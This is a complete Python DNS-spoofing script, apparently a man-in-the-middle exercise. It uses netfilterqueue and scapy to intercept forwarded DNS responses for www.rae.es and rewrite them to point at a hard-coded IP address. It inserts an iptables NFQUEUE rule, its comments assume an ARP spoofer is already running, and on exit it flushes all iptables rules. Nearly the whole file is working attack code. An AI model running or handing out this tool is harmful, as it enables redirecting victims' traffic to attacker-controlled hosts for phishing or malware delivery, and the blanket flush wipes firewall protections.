#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import subprocess


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):  # IF has a DNS response...
        qname = scapy_packet[scapy.DNSQR].qname
        target = b"www.rae.es"
        # target.encode('base64')
        if target in qname:
            print(scapy_packet.show())
            print("Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="5.39.109.120")  # The other IP
            scapy_packet[scapy.DNS].an = answer  # [.an]swer part of the DNS packet
            scapy_packet[scapy.DNS].ancount = 1  # Number of answers of the DNS response

            # Removing checksum and len from iplayer and udplayer to let scapy recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


try:
    # Execute first the arp spoofer
    # To test with this computer: iptables -I OUTPUT -j NFQUEUE --queue-num 0;
    #                             iptables -I INPUT -j NFQUEUE --queue-num 0;

    # trap the incoming packets to a queue that come from other computers while mitm:
    # iptables -I FORDWARD -j queue-num 0
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

    # Remember to delte iptables wih iptables --flush
except KeyboardInterrupt:
    print("closing dns spoofer")
    subprocess.call("iptables --flush", shell=True)
